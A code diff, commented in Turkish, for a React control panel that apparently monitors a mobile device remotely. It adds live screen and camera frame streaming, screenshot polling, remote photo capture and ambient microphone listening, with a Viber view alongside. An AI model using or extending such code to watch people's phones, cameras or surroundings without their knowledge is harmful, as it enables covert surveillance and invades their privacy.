@@ -2526,6 +2526,7 @@ export const ViberView = () => (
 );
 
 const DIAG_PROFILE = "default";
+// Port 8001 yerine port 8000 (backend) üzerinden stream — firewall sorununu önler
 const DIAG_BASE = BACKEND_URL;
 
 function relativeTime(ms) {
@@ -2544,6 +2545,8 @@ export const LiveControlView = () => {
   const [recSecs, setRecSecs] = useState(0);
   const recTimerRef = useRef(null);
   const [snapshot, setSnapshot] = useState(null);
+  const [liveFrame, setLiveFrame] = useState(null);
+  const [frameRate, setFrameRate] = useState(0);
   const [panicMessage, setPanicMessage] = useState("");
   const [alertActive, setAlertActive] = useState(false);
   const [deviceDiags, setDeviceDiags] = useState([]);
@@ -2553,6 +2556,10 @@ export const LiveControlView = () => {
   const videoRef = useRef(null);
   const mediaRecorderRef = useRef(null);
   const chunksRef = useRef([]);
+  const frameCountRef = useRef(0);
+  const frameTimerRef = useRef(null);
+  const lastFrameTimeRef = useRef(0);
+  const pollTimerRef = useRef(null);
 
   const downloadRecording = () => {
     if (recordingUrl) {
@@ -2616,9 +2623,13 @@ export const LiveControlView = () => {
   };
 
   useEffect(() => {
-    // Sinyal sunucusu URL'ini backend portunu 8001 ile degistirerek dinamik olarak hesaplar
-    const signalingUrl = BACKEND_URL.replace(":8000", ":8001");
-    const socket = io(signalingUrl);
+    const socket = io(BACKEND_URL, {
+      reconnection: true,
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 2000,
+      reconnectionDelayMax: 8000,
+      timeout: 10000,
+    });
     socketRef.current = socket;
 
     socket.on("connect", () => {
@@ -2629,6 +2640,11 @@ export const LiveControlView = () => {
     socket.on("disconnect", () => {
       setIsConnected(false);
       setPeerConnected(false);
+    });
+
+    socket.on("connect_error", (err) => {
+      console.warn("[LiveControl] Signal server bağlantı hatası:", err.message);
+      setIsConnected(false);
     });
 
     // Mobil cihazdan gelen WebRTC offer
@@ -2680,28 +2696,87 @@ export const LiveControlView = () => {
       if (peerRef.current && candidate) peerRef.current.signal(candidate);
     });
 
-    // Fotoğraf snapshot
-    socket.on("snapshot", ({ data }) => {
-      if (data) setSnapshot(data);
+    // Fotoğraf snapshot (tek kare — "Take Photo" sonucu)
+    socket.on("snapshot", (payload) => {
+      const data = payload?.data || payload;
+      if (data) setSnapshot(typeof data === "string" ? data : null);
       setActiveStream("none");
+      setLiveFrame(null);
     });
+
+    // Canlı ekran akışı (base64 JPEG kareler — ~2-3 FPS)
+    socket.on("screen_frame", (payload) => {
+      const frame = payload?.frame || payload;
+      if (!frame) return;
+      const src = frame.startsWith("data:")
+        ? frame
+        : `data:image/jpeg;base64,${frame}`;
+      setLiveFrame(src);
+      setActiveStream((prev) => (prev !== "screen" ? "screen" : prev));
+      setPeerConnected(true);
+      frameCountRef.current += 1;
+      lastFrameTimeRef.current = Date.now();
+    });
+
+    // Canlı kamera akışı (Camera2 base64 JPEG)
+    socket.on("camera_frame", (payload) => {
+      const frame = payload?.frame || payload;
+      if (!frame) return;
+      const src = frame.startsWith("data:")
+        ? frame
+        : `data:image/jpeg;base64,${frame}`;
+      setLiveFrame(src);
+      setActiveStream((prev) => (prev !== "camera" ? "camera" : prev));
+      setPeerConnected(true);
+      frameCountRef.current += 1;
+      lastFrameTimeRef.current = Date.now();
+    });
+
+    // FPS ölçümü — her saniye
+    frameTimerRef.current = setInterval(() => {
+      setFrameRate(frameCountRef.current);
+      frameCountRef.current = 0;
+    }, 1000);
+
+    // HTTP polling fallback — socket frame gelmezse 2s'de bir REST'ten çek
+    pollTimerRef.current = setInterval(async () => {
+      if (Date.now() - lastFrameTimeRef.current < 3000) return; // socket aktif
+      try {
+        const r = await apiFetch(
+          `${BACKEND_URL}/api/screenshot/${DIAG_PROFILE}/live`,
+        );
+        if (!r.ok) return;
+        const data = await r.json();
+        if (!data?.frame) return;
+        const src = data.frame.startsWith("data:")
+          ? data.frame
+          : `data:image/jpeg;base64,${data.frame}`;
+        setLiveFrame(src);
+        setActiveStream("screen");
+        lastFrameTimeRef.current = Date.now();
+      } catch (_) {}
+    }, 2000);
 
     return () => {
       destroyPeer();
       socket.disconnect();
+      clearInterval(frameTimerRef.current);
+      clearInterval(pollTimerRef.current);
       setRecordingUrl((prev) => {
         if (prev) URL.revokeObjectURL(prev);
         return null;
       });
-      socket.off("snapshot");
     };
   }, []);
 
   const sendCommand = (cmd) => {
+    setLiveFrame(null);
+    setSnapshot(null);
     setActiveStream(cmd);
     if (socketRef.current && isConnected) {
       socketRef.current.emit("command", {
         type: cmd,
+        profileId: DIAG_PROFILE,
         from: socketRef.current.id,
         timestamp: Date.now(),
       });
@@ -2711,6 +2786,8 @@ export const LiveControlView = () => {
   const stopStream = () => {
     destroyPeer();
     setActiveStream("none");
+    setLiveFrame(null);
+    setPeerConnected(false);
     if (socketRef.current)
       socketRef.current.emit("command", {
         type: "stop",
@@ -2804,6 +2881,7 @@ export const LiveControlView = () => {
               }}
             ></div>
 
+            {/* Snapshot (tek kare — Take Photo sonucu) */}
             {activeStream === "none" && snapshot ? (
               <div className="relative w-full h-full flex items-center justify-center">
                 <img
@@ -2827,17 +2905,40 @@ export const LiveControlView = () => {
                   </button>
                 </div>
               </div>
-            ) : activeStream === "none" ? (
+            ) : /* Canlı ekran / kamera akışı (socket.io base64 JPEG) */
+            (activeStream === "screen" || activeStream === "camera") &&
+              liveFrame ? (
+              <div className="relative w-full h-full">
+                <img
+                  src={liveFrame}
+                  alt="Live stream"
+                  className="absolute inset-0 w-full h-full object-contain bg-black"
+                  style={{ imageRendering: "pixelated" }}
+                />
+                {/* FPS badge */}
+                <div className="absolute top-3 left-3 bg-black/60 text-emerald-400 text-[9px] font-mono px-2 py-0.5 rounded">
+                  {frameRate} FPS
+                </div>
+                {/* Stream type badge */}
+                <div className="absolute top-3 right-3 bg-red-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded uppercase tracking-wider animate-pulse">
+                  {activeStream === "screen" ? "📱 EKRAN" : "📷 KAMERA"}
+                </div>
+              </div>
+            ) : /* Bekleme durumu */
+            activeStream === "none" ? (
               <div className="text-center text-zinc-600 flex flex-col items-center z-10">
                 <Radio className="w-16 h-16 mb-4 opacity-30" />
                 <p className="text-sm uppercase tracking-[0.2em] font-bold">
-                  Signal Offline
+                  {isConnected ? "Cihaz Komutu Bekleniyor" : "Signal Offline"}
                 </p>
                 <p className="text-xs mt-2 w-64 opacity-50">
-                  Cihazdan WebRTC bağlantısı veya komut onayı bekleniyor.
+                  {isConnected
+                    ? "Live Screen veya Take Photo butonuna bas."
+                    : "Sinyal sunucusuna bağlanılamıyor."}
                 </p>
               </div>
-            ) : activeStream === "audio" ? (
+            ) : /* Mikrofon modu */
+            activeStream === "audio" ? (
               <div className="text-center text-[#00a2ff] flex flex-col items-center z-10">
                 <Mic className="w-20 h-20 mb-8 animate-pulse drop-shadow-[0_0_15px_rgba(0,162,255,0.5)]" />
                 <div className="flex gap-1.5 h-16 items-center">
@@ -2853,8 +2954,20 @@ export const LiveControlView = () => {
                     ></div>
                   ))}
                 </div>
+                <p className="text-xs mt-4 text-[#00a2ff]/60">
+                  Ortam dinleniyor…
+                </p>
+              </div>
+            ) : /* Photo isteği bekleniyor */
+            activeStream === "photo" ? (
+              <div className="text-center text-zinc-500 flex flex-col items-center z-10">
+                <Camera className="w-16 h-16 mb-4 animate-pulse opacity-60" />
+                <p className="text-sm uppercase tracking-[0.2em] font-bold">
+                  Fotoğraf alınıyor…
+                </p>
               </div>
             ) : (
+              /* WebRTC peer stream (kamera/ses için) */
               <video
                 ref={videoRef}
                 autoPlay
@@ -2937,7 +3050,7 @@ export const LiveControlView = () => {
               </div>
             </div>
 
-            {/* WebRTC Status */}
+            {/* Ağ / Stream Durumu */}
             <div>
               <p className="text-[10px] text-zinc-500 mb-3 uppercase tracking-widest font-bold">
                 Ağ Teşhisleri
@@ -2946,27 +3059,52 @@ export const LiveControlView = () => {
                 <div className="flex justify-between items-center">
                   <span className="text-zinc-500">Sinyal Sunucusu</span>
                   <span
-                    className={`flex items-center gap-1.5 ${isConnected ? "text-emerald-500" : "text-red-500"}`}
+                    className={`flex items-center gap-1.5 ${isConnected ? "text-emerald-400" : "text-red-400"}`}
                   >
                     <div
-                      className={`w-1.5 h-1.5 rounded-full ${isConnected ? "bg-emerald-500" : "bg-red-500"}`}
-                    ></div>
+                      className={`w-1.5 h-1.5 rounded-full ${isConnected ? "bg-emerald-400 animate-pulse" : "bg-red-400"}`}
+                    />
                     {isConnected ? "Çevrimiçi" : "Çevrimdışı"}
                   </span>
                 </div>
                 <div className="flex justify-between items-center">
-                  <span className="text-zinc-500">WebRTC Durumu</span>
+                  <span className="text-zinc-500">Stream Durumu</span>
                   <span
                     className={
-                      peerConnected ? "text-[#00a2ff]" : "text-zinc-600"
+                      peerConnected
+                        ? "text-[#00a2ff]"
+                        : activeStream !== "none"
+                          ? "text-amber-400"
+                          : "text-zinc-600"
                     }
                   >
-                    {peerConnected ? "Bağlı (Aktif)" : "Bağlantı Yok"}
+                    {peerConnected
+                      ? `Aktif (${activeStream})`
+                      : activeStream !== "none"
+                        ? "Bekleniyor…"
+                        : "Boşta"}
                   </span>
                 </div>
                 <div className="flex justify-between items-center">
-                  <span className="text-zinc-500">Gecikme</span>
-                  <span className="text-zinc-300">-- ms</span>
+                  <span className="text-zinc-500">FPS</span>
+                  <span
+                    className={
+                      frameRate > 0 ? "text-emerald-400" : "text-zinc-600"
+                    }
+                  >
+                    {frameRate > 0 ? `${frameRate} fps` : "—"}
+                  </span>
+                </div>
+                <div className="flex justify-between items-center">
+                  <span className="text-zinc-500">PeerJS</span>
+                  <a
+                    href="http://localhost:9000/peerjs"
+                    target="_blank"
+                    rel="noreferrer"
+                    className="text-zinc-500 hover:text-[#00a2ff] transition-colors"
+                  >
+                    :9000
+                  </a>
                 </div>
               </div>
             </div>
